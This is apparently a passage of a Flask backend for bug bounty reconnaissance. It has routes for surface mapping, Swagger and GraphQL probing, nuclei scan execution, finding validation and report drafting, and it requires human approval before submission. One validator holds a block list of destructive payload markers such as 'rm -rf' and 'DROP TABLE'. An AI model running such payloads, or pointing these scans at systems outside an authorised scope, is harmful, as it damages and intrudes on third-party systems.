@app.route("/bounty/report/<report_id>/scope", methods=["POST"])
def bounty_verify_scope(report_id):
    """
    Operator manually verifies scope for a report.
    POST {verified, notes, program_name, platform}
    Elevates draft → ready_for_review when verified=true.

    [bounty] scope_verified=true id=...
    """
    from engine.bounty_db import verify_scope, get_report as _gr
    r = _gr(report_id)
    if not r:
        return jsonify({"error": "not found"}), 404
    p        = request.get_json(silent=True) or {}
    verified = bool(p.get("verified", False))
    verify_scope(report_id, verified,
                 notes        = p.get("notes",""),
                 program_name = p.get("program_name",""),
                 platform     = p.get("platform",""))
    updated = _gr(report_id)
    return jsonify({"ok": True, "report_id": report_id,
                    "scope_verified": verified,
                    "status": updated.get("status")})


@app.route("/bounty/report/<report_id>/package")
def bounty_package(report_id):
    """
    Download submission package ZIP for an approved report.
    GET /bounty/report/<report_id>/package

    Contains:
      report_draft.md, hackerone.md, intigriti.md,
      bugcrowd.md, evidence_bundle.md, payload_request.txt
    Requires: approved status.
    This is a human-copy-paste package. Nothing is submitted automatically.

    [bounty] package_ready platform=all id=...
    """
    from engine.bounty_report import build_package
    from flask import make_response as _mkr
    zip_bytes = build_package(report_id)
    if zip_bytes is None:
        return jsonify({"error": "Report not found or not approved yet"}), 422
    resp = _mkr(zip_bytes)
    resp.headers["Content-Type"]        = "application/zip"
    resp.headers["Content-Disposition"] = f'attachment; filename="bounty_{report_id}.zip"'
    return resp


@app.route("/bounty/report/<report_id>/payout", methods=["POST"])
def bounty_add_payout(report_id):
    """
    Record a payout for a resolved report.
    POST {amount, currency, program_name, platform, status, submitted_date, resolved_date, notes}

    [bounty] payout_updated amount=... id=...
    """
    from engine.bounty_db import add_payout, get_report as _gr
    r = _gr(report_id)
    if not r:
        return jsonify({"error": "report not found"}), 404
    p    = request.get_json(silent=True) or {}
    pid  = add_payout(
        report_id,
        amount         = float(p.get("amount",0)),
        currency       = p.get("currency","USD"),
        program_name   = p.get("program_name", r.get("program_name","")),
        platform       = p.get("platform",     r.get("platform","")),
        status         = p.get("status","resolved"),
        submitted_date = p.get("submitted_date",""),
        resolved_date  = p.get("resolved_date",""),
        notes          = p.get("notes",""),
    )
    return jsonify({"ok": True, "payout_id": pid,
                    "amount": p.get("amount",0),
                    "currency": p.get("currency","USD")})


@app.route("/bounty/stats")
def bounty_stats():
    """
    Payout and pipeline statistics.
    GET /bounty/stats?domain=example.com

    Returns: total_reports, by_status, total_bounty, average_payout,
             win_rate_pct, duplicate_rate_pct, confirmed_findings
    """
    from engine.bounty_db import get_stats as _gs
    domain   = _domain(request.args.get("domain",""))
    stats    = _gs()
    # Add confirmed finding count from scan DB
    if domain:
        findings = db.get_findings(domain) or []
        stats["confirmed_findings"] = sum(1 for f in findings
                                          if f.get("eil_confirmed"))
        stats["needs_review_findings"] = sum(1 for f in findings
                                              if f.get("status") == "needs_review")
    return jsonify(stats)


@app.route("/bounty/auto_draft", methods=["POST"])
def bounty_auto_draft():
    """
    Auto-create draft reports for all confirmed findings for a domain.
    POST {domain, program_name, platform}
    Skips rejected findings. Creates drafts for confirmed + needs_review.
    Returns list of created report_ids.

    [bounty] report_draft_created id=...
    [bounty] evidence_attached id=...
    """
    from engine.bounty_report import create_draft
    p       = request.get_json(silent=True, force=True) or {}
    domain  = _domain(p.get("domain",""))
    if not domain:
        return jsonify({"error": "domain required"}), 400

    # Load programs for scope gate
    programs = []
    try:
        _prog_path = Path(__file__).parent / "data" / "programs.json"
        if _prog_path.exists():
            programs = json.load(open(_prog_path))
        elif hasattr(db, "get_programs"):
            programs = db.get_programs() or []
    except Exception:
        pass

    findings = db.get_findings(domain) or []
    # Only process confirmed or high-confidence needs_review findings
    eligible = [f for f in findings
                if f.get("eil_confirmed")
                or (f.get("status") == "needs_review" and
                    f.get("eil_confidence",0) >= 50)]

    created = []
    skipped = 0
    for f in eligible[:50]:   # cap at 50 per call
        result = create_draft(domain, f, programs)
        if result.get("report_id"):
            created.append(result)
        else:
            skipped += 1

    return jsonify({
        "domain":       domain,
        "eligible":     len(eligible),
        "created":      len(created),
        "skipped":      skipped,
        "reports":      created,
    })



# ══════════════════════════════════════════════════════════════════════════════
# ELITE BUG BOUNTY RECON — Surface Intelligence v1
# ══════════════════════════════════════════════════════════════════════════════

def _get_surface_data(domain: str) -> tuple:
    """Helper: load hosts + endpoints and compute surface map."""
    from engine.surface_intel import map_surface
    hosts_info = db.get_hosts(domain) or {}
    hosts      = hosts_info.get("hosts") or hosts_info.get("enriched") or []
    eps_raw    = db.get_endpoints(domain, limit=50000) or []
    eps        = [e if isinstance(e, str) else e.get("url","") for e in eps_raw]
    surface    = map_surface(hosts, eps)
    return hosts, eps, surface


@app.route("/surface/map")
def surface_map():
    """
    Full attack surface map for a domain.
    GET /surface/map?domain=example.com&limit=100

    Returns classified hosts, endpoints, surface counts, top attack surfaces.
    [hunt] high_value_hosts=... hidden_endpoints_found=... top_targets_ready=...
    """
    d = _domain(request.args.get("domain",""))
    if not d:
        return jsonify({"error": "domain required"}), 400
    limit = min(int(request.args.get("limit","200")), 1000)
    hosts, eps, surface = _get_surface_data(d)
    hv_eps = surface.get("high_value_endpoints",[])
    log.info(
        f"[hunt] high_value_hosts={sum(1 for h in surface.get('top_hosts',[]) if h.get('is_high_value'))}"
        f" high_value_endpoints={len(hv_eps)}"
        f" top_targets_ready={min(10,len(hv_eps))}"
    )
    return jsonify({
        "domain":              d,
        "top_hosts":           surface.get("top_hosts",[])[:20],
        "surface_counts":      surface.get("surface_counts",{}),
        "top_attack_surfaces": surface.get("top_attack_surfaces",[]),
        "high_value_endpoints":hv_eps[:limit],
        "stats":               surface.get("stats",{}),
    })


@app.route("/surface/debug")
def surface_debug():
    """
    Full surface intelligence debug.
    GET /surface/debug?domain=example.com
    """
    d = _domain(request.args.get("domain",""))
    if not d:
        return jsonify({"error": "domain required"}), 400
    hosts, eps, surface = _get_surface_data(d)
    stats = surface.get("stats",{})
    return jsonify({
        "domain":                    d,
        "total_hosts_classified":    stats.get("total_hosts",0),
        "total_endpoints_classified":stats.get("total_endpoints",0),
        "high_value_endpoints":      stats.get("high_value_endpoints",0),
        "access_control_candidates": stats.get("access_control_candidates",0),
        "surface_counts":            surface.get("surface_counts",{}),
        "top_attack_surfaces":       surface.get("top_attack_surfaces",[]),
        "top_hosts":                 surface.get("top_hosts",[])[:10],
        "high_value_sample":         surface.get("high_value_endpoints",[])[:10],
        "skipped_low_value":         max(0, stats.get("total_endpoints",0) -
                                         stats.get("high_value_endpoints",0)),
    })


@app.route("/api/chains")
def api_chains():
    """
    API chain detection — IDOR/BOLA candidates grouped by object model.
    GET /api/chains?domain=example.com

    [hunt] api_chain_candidates=...
    """
    from engine.surface_intel import detect_api_chains
    d = _domain(request.args.get("domain",""))
    if not d:
        return jsonify({"error": "domain required"}), 400
    eps_raw = db.get_endpoints(d, limit=50000) or []
    eps     = [e if isinstance(e, str) else e.get("url","") for e in eps_raw]
    chains  = detect_api_chains(eps)
    log.info(f"[hunt] api_chain_candidates={chains.get('total_candidates',0)}"
             f" objects={chains.get('total_objects',0)}")
    return jsonify({"domain": d, **chains})


@app.route("/api/docs")
def api_docs_intel():
    """
    Parse Swagger/OpenAPI docs found for a domain.
    GET /api/docs?domain=example.com

    Searches common paths, parses schema, extracts endpoints + auth info.
    """
    from engine.surface_intel import parse_swagger
    from recon import _get as _recon_get
    d = _domain(request.args.get("domain",""))
    if not d:
        return jsonify({"error": "domain required"}), 400

    hosts_info = db.get_hosts(d) or {}
    live_hosts = (hosts_info.get("active") or [])[:20]

    SWAGGER_PATHS = ["/swagger.json","/swagger/v1/swagger.json","/api/swagger.json",
                     "/openapi.json","/api/openapi.json","/v3/api-docs","/api-docs",
                     "/api/docs","/api/schema"]
    docs: List[Dict] = []
    for host in live_hosts:
        for path in SWAGGER_PATHS:
            url = host.rstrip("/") + path
            try:
                r = _recon_get(url, timeout=8)
                if r and r[0] == 200 and r[2]:
                    parsed = parse_swagger(r[2], host)
                    if parsed.get("endpoints"):
                        parsed["source_url"] = url
                        docs.append(parsed)
                        log.info(f"[hidden] source=swagger host={host} endpoints={len(parsed['endpoints'])}")
                        break
            except Exception:
                pass

    return jsonify({
        "domain":      d,
        "docs_found":  len(docs),
        "swagger_docs": docs,
    })


@app.route("/graphql/intel")
def graphql_intel():
    """
    GraphQL endpoint detection and introspection parsing.
    GET /graphql/intel?domain=example.com
    """
    from engine.surface_intel import parse_graphql_schema
    from recon import _get as _recon_get
    d = _domain(request.args.get("domain",""))
    if not d:
        return jsonify({"error": "domain required"}), 400

    hosts_info = db.get_hosts(d) or {}
    live_hosts = (hosts_info.get("active") or [])[:20]

    GQL_PATHS = ["/graphql","/graphiql","/api/graphql","/v1/graphql","/query"]
    GQL_INTROSPECT = '{"query":"{__schema{types{name kind}}}"}'
    results: List[Dict] = []

    for host in live_hosts:
        for path in GQL_PATHS:
            url = host.rstrip("/") + path
            try:
                import requests as _rq
                r = _rq.post(url, data=GQL_INTROSPECT,
                             headers={"Content-Type":"application/json"},
                             timeout=8, verify=False)
                if r.status_code in (200, 400):  # 400 = exists but introspection blocked
                    schema = parse_graphql_schema(r.text)
                    results.append({
                        "url":                url,
                        "introspection_open": r.status_code == 200 and bool(schema),
                        "schema":             schema,
                        "status":             r.status_code,
                    })
                    log.info(f"[hidden] source=graphql host={host}"
                             f" url={url} introspection={r.status_code==200}")
                    break
            except Exception:
                pass

    return jsonify({
        "domain":       d,
        "graphql_found": len(results),
        "endpoints":    results,
    })


@app.route("/hunt/plan")
def hunt_plan():
    """
    Generate a safe, prioritized bug bounty test plan.
    GET /hunt/plan?domain=example.com

    Returns top 10 targets, test plans per bug class, expected bounty value.
    NO auto-exploitation. Safe test steps only.
    """
    from engine.surface_intel import map_surface, detect_api_chains, generate_test_plan
    d = _domain(request.args.get("domain",""))
    if not d:
        return jsonify({"error": "domain required"}), 400

    hosts, eps, surface = _get_surface_data(d)
    chains  = detect_api_chains(eps)
    plan    = generate_test_plan(d, surface, chains)

    log.info(
        f"[hunt] top_targets_ready={len(plan['top_10_targets'])}"
        f" test_plans={len(plan['test_plans'])}"
        f" expected_bounty={plan['expected_bounty_value']}"
    )
    return jsonify(plan)


@app.route("/hunt/debug")
def hunt_debug():
    """
    Full hunt intelligence debug.
    GET /hunt/debug?domain=example.com
    """
    from engine.surface_intel import (
        map_surface, detect_api_chains, generate_test_plan,
        classify_url, HIGH_VALUE
    )
    d = _domain(request.args.get("domain",""))
    if not d:
        return jsonify({"error": "domain required"}), 400

    hosts, eps, surface = _get_surface_data(d)
    chains  = detect_api_chains(eps)
    plan    = generate_test_plan(d, surface, chains)
    stats   = surface.get("stats",{})

    # Surface breakdown
    counts = surface.get("surface_counts",{})
    hv_eps = surface.get("high_value_endpoints",[])
    low_val_eps = [ep for ep, info in surface.get("endpoints",{}).items()
                   if not info.get("is_high_value") and not info.get("access_control_candidate")]

    log.info(
        f"[hunt] high_value_hosts={sum(1 for h in surface.get('top_hosts',[]) if h.get('is_high_value'))}"
        f" api_chain_candidates={chains.get('total_candidates',0)}"
        f" hidden_endpoints_found=0"
        f" top_targets_ready={len(plan['top_10_targets'])}"
    )

    return jsonify({
        "domain":                    d,
        "total_hosts_classified":    stats.get("total_hosts",0),
        "total_endpoints_classified":stats.get("total_endpoints",0),
        "high_value_endpoints":      len(hv_eps),
        "access_control_candidates": stats.get("access_control_candidates",0),
        "api_chains_found":          chains.get("total_candidates",0),
        "api_objects":               chains.get("total_objects",0),
        "high_value_hosts":          sum(1 for h in surface.get("top_hosts",[]) if h.get("is_high_value")),
        "skipped_low_value":         len(low_val_eps),
        "expected_bounty_value":     plan.get("expected_bounty_value","low"),
        "top_10_targets":            plan.get("top_10_targets",[]),
        "surface_counts":            counts,
        "top_idor_candidates":       chains.get("candidate_chains",[])[:5],
        "high_risk_objects":         chains.get("high_risk_tests",[])[:5],
        "signal_routing": {
            "high_score":   "full scan → EIL validation → bounty draft",
            "medium_score": "normal scan → EIL validation",
            "low_score":    "passive only",
        },
    })



# ══════════════════════════════════════════════════════════════════════════════
# ELITE RECON + VALIDATION SYSTEM
# Phases 1–6: target priority, safe test plans, nuclei routing,
#             controlled validation, bug chain suggestions, debug dashboard.
#
# HARD RULES (enforced in engine/elite_recon.py):
#   - No auto-exploitation
#   - No credential theft
#   - No persistence
#   - No destructive payloads
#   - Human approval required before any submission
# ══════════════════════════════════════════════════════════════════════════════

def _elite_data(domain: str) -> dict:
    """Load and compute all elite intel for a domain in one pass."""
    from engine.surface_intel import map_surface, detect_api_chains, generate_test_plan
    from engine.elite_recon  import rank_targets, build_nuclei_plan, build_chain_suggestions

    hosts_info = db.get_hosts(domain) or {}
    hosts      = hosts_info.get("hosts") or hosts_info.get("enriched") or []
    live       = hosts_info.get("active") or []
    eps_raw    = db.get_endpoints(domain, limit=50000) or []
    eps        = [e if isinstance(e,str) else e.get("url","") for e in eps_raw]

    surface    = map_surface(hosts, eps)
    chains     = detect_api_chains(eps)
    findings   = db.get_findings(domain) or []
    targets    = rank_targets(surface, chains, findings)
    nuclei_plan= build_nuclei_plan(targets, live)
    test_plan  = generate_test_plan(domain, surface, chains)
    chain_sugg = build_chain_suggestions(
        surface.get("surface_counts",{}), chains)

    try:
        from engine.bounty_db import list_reports as _lr
        bounty_reports = _lr(domain=domain, limit=500)
    except Exception:
        bounty_reports = []

    return dict(
        hosts=hosts, live=live, eps=eps,
        surface=surface, chains=chains,
        findings=findings, targets=targets,
        nuclei_plan=nuclei_plan, test_plan=test_plan,
        chain_suggestions=chain_sugg,
        bounty_reports=bounty_reports,
    )



# ── Elite Nuclei execution ────────────────────────────────────────────────────

@app.route("/elite/nuclei_run", methods=["POST"])
def elite_nuclei_run():
    """
    Phase 3 — Controlled nuclei execution driven by elite surface groups.
    POST {
      "domain":                "vercel.com",
      "groups":                ["api","auth","admin"],   // from /elite/nuclei_plan groups
      "max_targets_per_group": 100,
      "dry_run":               true                      // DEFAULT true — safe
    }

    dry_run=true  → return commands + target files only, nothing executed.
    dry_run=false → write target files, run nuclei, pipe into EIL + bounty draft.

    Safe settings enforced regardless of input:
      severity:    medium,high,critical  (never info/low)
      rate-limit:  100
      timeout:     5
      retries:     1
      random-agent: always

    [elite-nuclei] group=api targets=N tags=api,sqli,ssrf
    [elite-nuclei] raw_results=N confirmed=M needs_review=K
    """
    import threading as _nt, time as _nt_time, json as _nj
    from pathlib import Path as _NPath

    p       = request.get_json(silent=True, force=True) or {}
    domain  = _domain(p.get("domain",""))
    if not domain:
        return jsonify({"error": "domain required"}), 400

    requested_groups  = p.get("groups") or []   # empty = user must specify
    max_per_group     = min(int(p.get("max_targets_per_group", 100)), 200)
    dry_run           = p.get("dry_run", True)   # DEFAULT true — safe

    if not requested_groups:
        return jsonify({
            "error": "groups required — specify which surface groups to scan",
            "hint":  "Call /elite/nuclei_plan first to see available groups",
            "example_groups": ["api","auth","admin","upload","webhook"],
        }), 400

    # Build elite intel for this domain
    from engine.elite_recon import rank_targets, build_nuclei_plan, SURFACE_NUCLEI_TAGS
    from engine.surface_intel import map_surface, detect_api_chains

    hosts_info = db.get_hosts(domain) or {}
    hosts      = hosts_info.get("hosts") or []
    live       = hosts_info.get("active") or []
    eps_raw    = db.get_endpoints(domain, limit=50000) or []
    eps        = [e if isinstance(e,str) else e.get("url","") for e in eps_raw]

    surface     = map_surface(hosts, eps)
    chains      = detect_api_chains(eps)
    findings_db = db.get_findings(domain) or []
    targets_all = rank_targets(surface, chains, findings_db)
    nuclei_plan = build_nuclei_plan(targets_all, live)
    available   = nuclei_plan.get("groups", {})

    # Validate requested groups
    unknown = [g for g in requested_groups if g not in available and g not in SURFACE_NUCLEI_TAGS]
    if unknown:
        return jsonify({
            "error":     f"Unknown groups: {unknown}",
            "available": list(available.keys()),
        }), 400

    # Elite data dir
    elite_dir = Path(__file__).parent / "data" / "elite" / domain
    elite_dir.mkdir(parents=True, exist_ok=True)

    # Build per-group execution plan
    execution_plan = []
    for group in requested_groups:
        cfg = available.get(group) or SURFACE_NUCLEI_TAGS.get(group, {})
        if not cfg:
            continue
        group_targets = (cfg.get("targets") or [])[:max_per_group]
        if not group_targets:
            # Fall back to live hosts for this group
            group_targets = live[:max_per_group]
        if not group_targets:
            continue

        tags     = cfg.get("tags", ["exposure","misconfiguration"])
        severity = cfg.get("severity", ["medium","high","critical"])
        # Hard rule: never info/low
        severity = [s for s in severity if s in ("medium","high","critical")]
        if not severity:
            severity = ["medium","high","critical"]

        target_file = str(elite_dir / f"targets_{group}.txt")

        # Build safe nuclei CLI
        from engine.nuclei_engine import get_binary as _get_nbin
        nuclei_bin = _get_nbin() or "nuclei"
        cmd = [
            nuclei_bin,
            "-l",           target_file,
            "-tags",        ",".join(tags),
            "-severity",    ",".join(severity),
            "-rate-limit",  "100",          # safe cap
            "-timeout",     "5",
            "-retries",     "1",
            "-random-agent",
            "-jsonl",
            "-no-color",
            "-silent",
        ]

        log.info(
            f"[elite-nuclei] group={group}"
            f" targets={len(group_targets)}"
            f" tags={','.join(tags[:4])}"
        )

        execution_plan.append({
            "group":        group,
            "targets":      group_targets,
            "target_count": len(group_targets),
            "target_file":  target_file,
            "tags":         tags,
            "severity":     severity,
            "command":      " ".join(cmd),
        })

    if dry_run:
        # Write target files but DO NOT execute
        files_written = []
        for ep in execution_plan:
            tf = Path(ep["target_file"])
            tf.write_text("\n".join(ep["targets"]))
            files_written.append(str(tf))
        log.info(f"[elite-nuclei] dry_run=true groups={len(execution_plan)} files_written={len(files_written)}")
        return jsonify({
            "domain":         domain,
            "dry_run":        True,
            "groups":         len(execution_plan),
            "execution_plan": [{
                "group":        ep["group"],
                "target_count": ep["target_count"],
                "target_file":  ep["target_file"],
                "tags":         ep["tags"],
                "severity":     ep["severity"],
                "command":      ep["command"],
            } for ep in execution_plan],
            "files_written":  files_written,
            "note": "dry_run=true — target files written but nuclei NOT executed. "
                    "Set dry_run=false to run.",
        })

    # ── Live execution ────────────────────────────────────────────────────────
    from engine.nuclei_engine import scan as _nscan
    all_results:     List[Dict] = []
    group_summaries: List[Dict] = []

    for ep in execution_plan:
        # Write target file
        tf = Path(ep["target_file"])
        tf.write_text("\n".join(ep["targets"]))

        received  = [0]
        confirmed = [0]
        needs_rev = [0]
        grp_results: List[Dict] = []

        def _elite_emit(finding: Dict,
                        _ep=ep, _gr=grp_results,
                        _recv=received, _conf=confirmed, _nr=needs_rev):
            """Per-finding handler: EIL gate → bounty draft."""
            _recv[0] += 1
            bug = finding.get("bug","")
            sev = finding.get("severity","info")
            url = finding.get("url","")

            # Skip info/low — hard rule
            if sev in ("info","low"):
                return

            # EIL validation for high-value findings
            _NEEDS_CONFIRM = {"sqli","xss","ssrf","ssti","lfi","rce","xxe"}
            if bug in _NEEDS_CONFIRM and url and sev in ("critical","high"):
                try:
                    from engine.validation_engine import auto_validate as _av
                    _av(finding, db=db, domain=domain, timeout=10)
                except Exception:
                    pass

            if finding.get("eil_confirmed"):
                _conf[0] += 1
                finding["status"] = "confirmed"
            else:
                _nr[0]   += 1
                finding["status"] = "needs_review"

            # Persist finding
            finding["source"]    = f"elite_nuclei:{_ep['group']}"
            finding["dedup_key"] = f"en:{bug}:{url}:{finding.get('nuclei_template','')}".replace(" ","")[:48]
            db.add_finding(domain, finding)

            # Bounty auto-draft
            conf = finding.get("eil_confidence", finding.get("confidence",0))
            if finding.get("eil_confirmed") or conf >= 50:
                try:
                    from engine.bounty_report import create_draft as _cd
                    import json as _bj
                    _progs = []
                    _pp = Path(__file__).parent / "data" / "programs.json"
                    if _pp.exists():
                        _progs = _bj.loads(_pp.read_text())
                    _cd(domain, finding, _progs)
                except Exception:
                    pass

            _gr.append(finding)

        t0 = _nt_time.time()
        try:
            _nscan(
                targets      = ep["targets"],
                tags         = ep["tags"],
                severity     = ep["severity"],
                rate_limit   = 100,
                timeout      = 5,
                max_time     = 300,
                emit_fn      = _elite_emit,
                high_signal_only = True,
            )
        except Exception as _ne:
            log.warning(f"[elite-nuclei] group={ep['group']} error: {_ne}")

        elapsed = round(_nt_time.time() - t0, 1)
        log.info(
            f"[elite-nuclei]"
            f" raw_results={received[0]}"
            f" confirmed={confirmed[0]}"
            f" needs_review={needs_rev[0]}"
            f" group={ep['group']} elapsed={elapsed}s"
        )

        all_results.extend(grp_results)
        group_summaries.append({
            "group":        ep["group"],
            "targets_run":  ep["target_count"],
            "raw_results":  received[0],
            "confirmed":    confirmed[0],
            "needs_review": needs_rev[0],
            "elapsed_s":    elapsed,
        })

    # Store run metadata
    _run_meta = {
        "domain":    domain,
        "groups":    [ep["group"] for ep in execution_plan],
        "run_at":    int(_nt_time.time()),
        "summaries": group_summaries,
        "total_results": len(all_results),
        "total_confirmed": sum(g["confirmed"] for g in group_summaries),
    }
    _meta_path = elite_dir / "last_run.json"
    _meta_path.write_text(json.dumps(_run_meta, default=str))

    return jsonify({
        "domain":          domain,
        "dry_run":         False,
        "groups_run":      len(group_summaries),
        "group_summaries": group_summaries,
        "total_results":   len(all_results),
        "total_confirmed": sum(g["confirmed"] for g in group_summaries),
        "total_needs_review": sum(g["needs_review"] for g in group_summaries),
        "results_file":    str(_meta_path),
    })


@app.route("/elite/nuclei_results")
def elite_nuclei_results():
    """
    GET /elite/nuclei_results?domain=X&status=confirmed|needs_review&limit=50

    Returns nuclei findings from elite runs for a domain,
    filtered by status and enriched with EIL confidence.
    """
    d      = _domain(request.args.get("domain",""))
    status = request.args.get("status","")
    limit  = min(int(request.args.get("limit","50")), 200)
    if not d: return jsonify({"error":"domain required"}), 400

    findings_raw = db.get_findings(d) or []
    findings     = [f for f in findings_raw
                    if "elite_nuclei" in str(f.get("source",""))]

    if status:
        findings = [f for f in findings if f.get("status") == status]

    findings.sort(key=lambda f: (
        -{"critical":4,"high":3,"medium":2,"low":1,"info":0}.get(f.get("severity",""),0),
        -f.get("eil_confidence", f.get("confidence",0))
    ))

    # Last run metadata
    elite_dir = Path(__file__).parent / "data" / "elite" / d
    last_run  = {}
    meta_path = elite_dir / "last_run.json"
    if meta_path.exists():
        try:
            last_run = json.loads(meta_path.read_text())
        except Exception:
            pass

    return jsonify({
        "domain":    d,
        "total":     len(findings),
        "findings":  findings[:limit],
        "last_run":  last_run,
        "counts": {
            "confirmed":    sum(1 for f in findings if f.get("status") == "confirmed"),
            "needs_review": sum(1 for f in findings if f.get("status") == "needs_review"),
            "critical":     sum(1 for f in findings if f.get("severity") == "critical"),
            "high":         sum(1 for f in findings if f.get("severity") == "high"),
        }
    })


@app.route("/elite/targets")
def elite_targets():
    """
    Phase 1 — Unified target priority list.
    GET /elite/targets?domain=X&limit=50&min_score=5

    Returns targets scored and annotated with surface category,
    likely bug classes, and recommended tooling.

    [elite] targets_ranked=N
    """
    d         = _domain(request.args.get("domain",""))
    limit     = min(int(request.args.get("limit","50")), 200)
    min_score = int(request.args.get("min_score","1"))
    if not d: return jsonify({"error":"domain required"}), 400

    data    = _elite_data(d)
    targets = [t for t in data["targets"] if t["score"] >= min_score]

    return jsonify({
        "domain":          d,
        "total":           len(targets),
        "targets":         targets[:limit],
        "by_priority":     {
            p: sum(1 for t in targets if t.get("priority") == p)
            for p in ("critical","high","medium","low")
        },
        "already_confirmed": sum(1 for t in targets if t.get("already_confirmed")),
    })


@app.route("/elite/test_plan")
def elite_test_plan():
    """
    Phase 2 — Safe test plan per domain.
    GET /elite/test_plan?domain=X

    Returns concrete, human-executable test plans.
    No destructive payloads. No auto-exploitation.

    [elite] test_plans=N
    """
    d = _domain(request.args.get("domain",""))
    if not d: return jsonify({"error":"domain required"}), 400

    data = _elite_data(d)
    tp   = data["test_plan"]
    log.info(f"[elite] test_plans={tp.get('test_plan_count',0)}")
    return jsonify({
        "domain":                d,
        "test_plan_count":       tp.get("test_plan_count",0),
        "expected_bounty_value": tp.get("expected_bounty_value","low"),
        "top_10_targets":        tp.get("top_10_targets",[]),
        "test_plans":            tp.get("test_plans",[]),
        "note":                  tp.get("note",""),
    })


@app.route("/elite/nuclei_plan")
def elite_nuclei_plan():
    """
    Phase 3 — Nuclei template router (tag-filtered, no destructive templates).
    GET /elite/nuclei_plan?domain=X

    Returns grouped target URL lists and per-category nuclei tag sets.
    Run nuclei externally using the returned tags and target files.

    [elite] nuclei_group {surface} targets=N tags=...
    """
    d = _domain(request.args.get("domain",""))
    if not d: return jsonify({"error":"domain required"}), 400

    data = _elite_data(d)
    np   = data["nuclei_plan"]

    # Build nuclei CLI hints for each group
    cli_hints = {}
    for surf, grp in np.get("groups",{}).items():
        tags_str = ",".join(grp["tags"])
        sev_str  = ",".join(grp["severity"])
        cli_hints[surf] = (
            f"nuclei -l targets_{surf}.txt"
            f" -tags {tags_str}"
            f" -severity {sev_str}"
            f" -rate-limit 50 -retries 1 -timeout 8"
        )

    return jsonify({
        "domain":        d,
        "total_groups":  np.get("total_groups",0),
        "total_targets": np.get("total_targets",0),
        "groups":        np.get("groups",{}),
        "cli_hints":     cli_hints,
        "note":          np.get("note",""),
    })


@app.route("/elite/chains")
def elite_chains():
    """
    Phase 5 — Bug chain hypotheses (safe, no exploit execution).
    GET /elite/chains?domain=X

    Returns chain hypotheses based on observed surfaces.
    Each chain has concrete safe test steps.

    [elite] chain_suggestions=N
    """
    d = _domain(request.args.get("domain",""))
    if not d: return jsonify({"error":"domain required"}), 400

    data  = _elite_data(d)
    suggs = data["chain_suggestions"]

    return jsonify({
        "domain":              d,
        "chain_count":         len(suggs),
        "chain_suggestions":   suggs,
        "api_chains":          data["chains"].get("candidate_chains",[])[:10],
        "high_risk_objects":   data["chains"].get("high_risk_tests",[])[:10],
    })


@app.route("/elite/debug")
def elite_debug():
    """
    Phase 6 — Full elite system debug dashboard.
    GET /elite/debug?domain=X

    Returns counts for every pipeline stage plus signal routing logic.

    [elite] targets_ranked=N test_plans=N chain_suggestions=N reports_ready=N
    """
    from engine.elite_recon import build_debug_summary
    d = _domain(request.args.get("domain",""))
    if not d: return jsonify({"error":"domain required"}), 400

    data    = _elite_data(d)
    summary = build_debug_summary(
        domain          = d,
        targets         = data["targets"],
        nuclei_plan     = data["nuclei_plan"],
        test_plan       = data["test_plan"],
        chain_suggestions = data["chain_suggestions"],
        findings        = data["findings"],
        bounty_reports  = data["bounty_reports"],
    )
    return jsonify(summary)


@app.route("/elite/validate", methods=["POST"])
def elite_validate():
    """
    Phase 4 — Controlled EIL validation (no auto-exploitation).
    POST {domain, finding}

    Runs baseline → probe → negative control → evidence capture.
    Marks finding confirmed or needs_review.
    If confirmed → auto-creates bounty draft.

    DO NOT submit results automatically.
    Human approval required before any bounty submission.
    """
    from engine.validation_engine import auto_validate
    p       = request.get_json(silent=True, force=True) or {}
    domain  = _domain(p.get("domain",""))
    finding = p.get("finding")
    if not domain or not finding:
        return jsonify({"error":"domain and finding required"}), 400

    # Safe guard — refuse any finding that looks like an active exploit attempt
    payload = str(finding.get("payload","")).lower()
    unsafe_markers = ["rm -rf","DROP TABLE","exec(","eval(","__import__",
                      "os.system","shutdown","format c:"]
    if any(m in payload for m in unsafe_markers):
        log.warning(f"[elite] validate blocked: unsafe payload detected")
        return jsonify({
            "error": "Payload contains unsafe markers — validation blocked",
            "safe":  False,
        }), 422

    try:
        result = auto_validate(finding, db=db, domain=domain, timeout=12)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

    confirmed = finding.get("eil_confirmed", False)
    conf      = finding.get("eil_confidence", finding.get("confidence",0))

    # Auto-draft if confirmed
    report_id = None
    if confirmed or conf >= 50:
        try:
            from engine.bounty_report import create_draft
            import json as _j
            _progs = []
            try:
                _pp = Path(__file__).parent / "data" / "programs.json"
                if _pp.exists():
                    _progs = _j.loads(_pp.read_text())
            except Exception:
                pass
            draft = create_draft(domain, finding, _progs)
            report_id = draft.get("report_id")
        except Exception as _de:
            log.debug(f"[elite] validate draft: {_de}")

    log.info(
        f"[elite] validate confirmed={confirmed} confidence={conf}"
        f" report_id={report_id}"
    )

    return jsonify({
        "domain":       domain,
        "eil_confirmed": confirmed,
        "eil_confidence": conf,
        "eil_proof":    finding.get("eil_proof",""),
        "status":       "confirmed" if confirmed else
                        "needs_review" if conf >= 40 else "rejected",
        "report_id":    report_id,
        "note":         "Human approval required before any submission.",
        "safe":         True,
        "auto_exploit": False,
    })



# ══════════════════════════════════════════════════════════════════════════════
# SYSTEM HEALTH CHECK
# ══════════════════════════════════════════════════════════════════════════════


@app.route("/system/slow_routes")
def system_slow_routes():
    """
    GET /system/slow_routes
    Returns the last 100 requests that took more than 2 seconds.
    Useful for finding blocking routes.
    """
    return jsonify({
        "slow_routes":   _SLOW_LOG[-50:],   # most recent 50
        "total_logged":  len(_SLOW_LOG),
        "threshold_s":   2.0,
        "note":          "Routes are logged here when response time > 2s",
    })


@app.route("/oob/status")
def oob_status():
    """
    GET /oob/status
    Returns current OOB/interactsh host and validates it is a bare hostname.
    Host must NOT contain http:// or https://.
    """
    import re as _ore
    env_host = (os.environ.get("BXSS_HOST","") or
                os.environ.get("OOB_HOST","") or
                os.environ.get("INTERACTSH_SERVER",""))

    host = ""
    try:
        from engine.oob import get_oob_host as _goh
        host = _goh() or ""
    except Exception:
        pass

    if not host and env_host:
        host = _ore.sub(r'^https?://', '', env_host).rstrip('/')

    if not host:
        try:
            from engine.oob import InteractshClient as _OOB
            oob  = _OOB()
            host = getattr(oob, 'host', '') or ''
        except Exception:
            pass

    # Normalise regardless of source (strips any accidentally-included scheme)
    host = _ore.sub(r'^https?://', '', host or '').rstrip('/')

    has_scheme    = bool(re.search(r'https?://', host))
    is_valid_host = bool(host and not has_scheme and
                         re.match(r'^[a-z0-9][a-z0-9.\-]+\.[a-z]{2,}$', host))

    return jsonify({
        "host":           host or None,
        "valid":          is_valid_host,
